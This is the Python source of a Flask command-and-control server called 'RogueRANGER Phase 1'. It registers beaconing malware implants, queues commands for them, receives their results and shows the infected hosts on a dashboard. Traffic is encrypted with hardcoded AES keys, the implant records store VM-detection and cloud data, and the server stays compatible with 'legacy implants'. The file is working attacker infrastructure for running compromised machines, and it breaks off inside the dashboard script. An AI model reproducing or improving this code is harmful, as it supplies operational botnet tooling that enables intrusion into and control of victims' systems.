#!/usr/bin/env python3
"""
rogue_c2_phase1_final.py - COMPLETE Phase 1 C2 Server
Enhanced version of rogue_c2.py with full Phase 1 support
Maintains 100% backward compatibility with legacy implants
"""

from flask import Flask, request, jsonify, render_template_string
import threading, base64, os, socket, time
import zipfile, json
from Cryptodome.Cipher import AES
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from datetime import datetime
import subprocess
import requests
from collections import defaultdict
import hashlib
import sqlite3
from pathlib import Path

app = Flask(__name__)
app.secret_key = 'RogueC2_Phase1_v2'

# === Configuration ===
LEGACY_SECRET_KEY = b'6767BabyROGUE!&%5'
LEGACY_EXFIL_KEY = b'magicRogueSEE!333'

C2_PORT = 4444
EXFIL_PORT = 9091
PAYLOAD_PORT = 8000

# === Phase 1 Database ===
DB_PATH = "phase1_implants.db"

def init_phase1_db():
    """Initialize Phase 1 database"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS implants (
            implant_id TEXT PRIMARY KEY,
            implant_hash TEXT,
            public_key TEXT,
            master_key_encrypted TEXT,
            payload_key_encrypted TEXT,
            key_rotation_date DATETIME,
            key_ttl_hours INTEGER DEFAULT 24,
            phase1_enabled BOOLEAN DEFAULT 1,
            vm_detection_data TEXT,
            first_seen DATETIME,
            last_beacon DATETIME,
            beacon_count INTEGER DEFAULT 0,
            commands_sent INTEGER DEFAULT 0,
            results_received INTEGER DEFAULT 0,
            cloud_info TEXT,
            notes TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS phase1_commands (
            command_id TEXT PRIMARY KEY,
            implant_id TEXT,
            command_type TEXT,
            command_payload TEXT,
            command_metadata TEXT,
            created_at DATETIME,
            executed_at DATETIME,
            result TEXT,
            status TEXT DEFAULT 'pending',
            FOREIGN KEY (implant_id) REFERENCES implants (implant_id)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS key_rotations (
            rotation_id INTEGER PRIMARY KEY AUTOINCREMENT,
            implant_id TEXT,
            old_key_hash TEXT,
            new_key_hash TEXT,
            rotated_at DATETIME,
            reason TEXT,
            FOREIGN KEY (implant_id) REFERENCES implants (implant_id)
        )
    ''')
    
    conn.commit()
    conn.close()
    print(f"[PHASE1] Database initialized: {DB_PATH}")

init_phase1_db()

# === Storage ===
connected_bots = set()
pending_commands = defaultdict(list)
command_results = defaultdict(list)
bot_info = {}
ip_to_bot_id = {}

# === Helper Functions ===

def get_implant_info(implant_id):
    """Get implant info from database"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM implants WHERE implant_id = ? OR implant_hash = ?', 
                   (implant_id, implant_id))
    
    row = cursor.fetchone()
    conn.close()
    
    if row:
        columns = [desc[0] for desc in cursor.description]
        return dict(zip(columns, row))
    return None

def store_implant_info(implant_data):
    """Store or update implant info"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    implant_id = implant_data.get('implant_id')
    
    existing = get_implant_info(implant_id)
    
    if existing:
        cursor.execute('''
            UPDATE implants SET
                last_beacon = ?,
                beacon_count = beacon_count + 1,
                vm_detection_data = ?,
                cloud_info = ?
            WHERE implant_id = ?
        ''', (
            now,
            json.dumps(implant_data.get('vm_detection', {})),
            json.dumps(implant_data.get('cloud_info', {})),
            implant_id
        ))
    else:
        cursor.execute('''
            INSERT INTO implants (
                implant_id, implant_hash, phase1_enabled,
                vm_detection_data, cloud_info,
                first_seen, last_beacon, beacon_count
            ) VALUES (?, ?, ?, ?, ?, ?, ?, 1)
        ''', (
            implant_id,
            implant_data.get('implant_hash'),
            implant_data.get('phase1_enabled', True),
            json.dumps(implant_data.get('vm_detection', {})),
            json.dumps(implant_data.get('cloud_info', {})),
            now, now
        ))
    
    conn.commit()
    conn.close()
    return True

def legacy_encrypt(msg):
    """Legacy encryption"""
    cipher = AES.new(LEGACY_SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode('utf-8'))
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def legacy_decrypt(data):
    """Legacy decryption"""
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(LEGACY_SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')

def get_bot_id(client_ip, implant_id=None):
    """Get bot ID"""
    if implant_id:
        bot_id = f"phase1_{implant_id}"
        ip_to_bot_id[bot_id] = bot_id
        return bot_id
    
    if client_ip in ip_to_bot_id:
        return ip_to_bot_id[client_ip]
    
    bot_hash = hashlib.md5(client_ip.encode()).hexdigest()[:8]
    bot_id = f"bot_{client_ip.replace('.', '_')}_{bot_hash}"
    ip_to_bot_id[client_ip] = bot_id
    return bot_id

# === Phase 1 Routes ===

@app.route('/phase1/beacon', methods=['POST'])
def phase1_beacon():
    """Handle Phase 1 beacons"""
    try:
        client_ip = request.remote_addr
        data = request.get_data()
        
        if not data:
            return legacy_encrypt(json.dumps({'error': 'No data'})), 400
        
        # Try to parse as JSON (Phase 1)
        try:
            data_str = data.decode('utf-8')
            beacon_data = json.loads(data_str)
            
            # Validate Phase 1 beacon
            if 'implant_id' not in beacon_data and 'implant_hash' not in beacon_data:
                raise ValueError("Not a Phase 1 beacon")
            
            implant_id = beacon_data.get('implant_id') or beacon_data.get('implant_hash')
            
            # Store in database
            store_implant_info(beacon_data)
            
            # Get bot ID
            bot_id = get_bot_id(client_ip, implant_id)
            connected_bots.add(bot_id)
            
            # Update bot info
            if bot_id not in bot_info:
                bot_info[bot_id] = {
                    'ip': client_ip,
                    'implant_id': implant_id,
                    'phase1_enabled': True,
                    'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'beacon_count': 0
                }
            
            bot_info[bot_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            bot_info[bot_id]['beacon_count'] += 1
            
            # Check for pending commands
            pending = pending_commands.get(bot_id, [])
            
            # Prepare response
            response = {
                'commands': pending,
                'message': 'Phase 1 beacon received',
                'timestamp': datetime.now().isoformat()
            }
            
            # Clear pending commands
            if pending:
                pending_commands[bot_id] = []
            
            return legacy_encrypt(json.dumps(response)), 200
            
        except:
            # Not a Phase 1 beacon, try legacy
            pass
        
        # Legacy beacon handling
        try:
            decrypted = legacy_decrypt(data)
            
            if decrypted == "beacon":
                bot_id = get_bot_id(client_ip)
                connected_bots.add(bot_id)
                
                if bot_id not in bot_info:
                    bot_info[bot_id] = {
                        'ip': client_ip,
                        'phase1_enabled': False,
                        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'beacon_count': 0
                    }
                
                bot_info[bot_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                bot_info[bot_id]['beacon_count'] += 1
                
                pending = pending_commands.get(bot_id, [])
                response = {'commands': pending}
                
                if pending:
                    pending_commands[bot_id] = []
                
                return legacy_encrypt(json.dumps(response)), 200
            
            return legacy_encrypt(json.dumps({'error': 'Unknown command'})), 400
            
        except:
            return legacy_encrypt(json.dumps({'error': 'Decryption failed'})), 400
            
    except Exception as e:
        return legacy_encrypt(json.dumps({'error': str(e)})), 500

@app.route('/phase1/command', methods=['POST'])
def phase1_add_command():
    """Add command for implant"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data'}), 400
        
        implant_id = data.get('implant_id')
        command_type = data.get('type')
        command_payload = data.get('payload', {})
        
        if not implant_id or not command_type:
            return jsonify({'error': 'Missing implant_id or type'}), 400
        
        import uuid
        command_id = str(uuid.uuid4())[:8]
        
        command = {
            'id': command_id,
            'type': command_type,
            'payload': command_payload,
            'timestamp': datetime.now().isoformat()
        }
        
        # Store in database
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO phase1_commands 
            (command_id, implant_id, command_type, command_payload, created_at, status)
            VALUES (?, ?, ?, ?, ?, 'pending')
        ''', (
            command_id,
            implant_id,
            command_type,
            json.dumps(command_payload),
            datetime.now().isoformat()
        ))
        
        conn.commit()
        conn.close()
        
        # Add to pending commands
        bot_id = get_bot_id(request.remote_addr, implant_id)
        pending_commands[bot_id].append(command)
        
        return jsonify({
            'success': True,
            'command_id': command_id,
            'message': f'Command added for {implant_id}'
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/phase1/result', methods=['POST'])
def phase1_result():
    """Receive command results"""
    try:
        data = request.get_data()
        
        if not data:
            return legacy_encrypt(json.dumps({'error': 'No data'})), 400
        
        # Try to decrypt
        try:
            decrypted = legacy_decrypt(data)
            result_data = json.loads(decrypted)
        except:
            return legacy_encrypt(json.dumps({'error': 'Decryption failed'})), 400
        
        command_id = result_data.get('command_id')
        implant_id = result_data.get('implant_id') or result_data.get('implant_hash')
        
        if not command_id:
            return legacy_encrypt(json.dumps({'error': 'Missing command_id'})), 400
        
        # Store result
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE phase1_commands SET
                executed_at = ?,
                result = ?,
                status = 'completed'
            WHERE command_id = ? AND implant_id = ?
        ''', (
            datetime.now().isoformat(),
            json.dumps(result_data),
            command_id,
            implant_id
        ))
        
        conn.commit()
        conn.close()
        
        return legacy_encrypt(json.dumps({'success': True})), 200
        
    except Exception as e:
        return legacy_encrypt(json.dumps({'error': str(e)})), 500

@app.route('/phase1/implants', methods=['GET'])
def phase1_list_implants():
    """List all implants"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT implant_id, implant_hash, phase1_enabled, 
                   first_seen, last_beacon, beacon_count
            FROM implants
            ORDER BY last_beacon DESC
        ''')
        
        implants = []
        for row in cursor.fetchall():
            implants.append({
                'implant_id': row[0],
                'implant_hash': row[1],
                'phase1_enabled': bool(row[2]),
                'first_seen': row[3],
                'last_beacon': row[4],
                'beacon_count': row[5]
            })
        
        conn.close()
        
        return jsonify({
            'success': True,
            'implants': implants,
            'count': len(implants)
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/phase1/dashboard', methods=['GET'])
def phase1_dashboard():
    """Web dashboard"""
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>RogueRANGER Phase 1 Dashboard</title>
        <style>
            body { font-family: monospace; margin: 20px; background: #0a0a0a; color: #00ff00; }
            h1 { color: #ff00ff; }
            .container { max-width: 1200px; margin: 0 auto; }
            .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 20px 0; }
            .stat-box { background: #1a1a1a; padding: 15px; border-radius: 5px; border: 1px solid #333; }
            .stat-value { font-size: 24px; font-weight: bold; color: #00ffff; }
            .implants-table { width: 100%; border-collapse: collapse; margin: 20px 0; }
            .implants-table th, .implants-table td { border: 1px solid #333; padding: 10px; text-align: left; }
            .implants-table th { background: #222; }
            .implants-table tr:nth-child(even) { background: #151515; }
            .phase1-badge { background: #00aa00; color: white; padding: 2px 6px; border-radius: 3px; font-size: 12px; }
            .legacy-badge { background: #aa0000; color: white; padding: 2px 6px; border-radius: 3px; font-size: 12px; }
            .online { color: #00ff00; }
            .offline { color: #ff0000; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 RogueRANGER Phase 1 Dashboard</h1>
            
            <div class="stats">
                <div class="stat-box">
                    <div>Total Implants</div>
                    <div class="stat-value" id="total-implants">0</div>
                </div>
                <div class="stat-box">
                    <div>Phase 1 Implants</div>
                    <div class="stat-value" id="phase1-implants">0</div>
                </div>
                <div class="stat-box">
                    <div>Online Now</div>
                    <div class="stat-value" id="online-implants">0</div>
                </div>
                <div class="stat-box">
                    <div>Commands Today</div>
                    <div class="stat-value" id="commands-today">0</div>
                </div>
            </div>
            
            <h2>Recent Implants</h2>
            <table class="implants-table" id="implants-table">
                <thead>
                    <tr>
                        <th>Implant ID</th>
                        <th>Phase 1</th>
                        <th>Last Beacon</th>
                        <th>Beacons</th>
                        <th>Status</th>
                    </tr>
                </thead>
                <tbody id="implants-body">
                </tbody>
            </table>
            
            <h2>Quick Actions</h2>
            <div>
                <button onclick="refreshData()">🔄 Refresh</button>
                <button onclick="testConnection()">🧪 Test</button>
            </div>
        </div>
        
        <script>
            async function refreshData() {
                try {
                    const response = await fetch('/phase1/implants');
                    const data = await response.json();
                    
                    if (data.success) {
                        document.getElementById('total-implants').textContent = data.count;
                        
                        const phase1Count = data.implants.filter(i => i.phase1_enabled).length;
                        document.getElementById('phase1-implants').textContent = phase1Count;
                        
                        const tbody = document.getElementById('implants-body');
                        tbody.innerHTML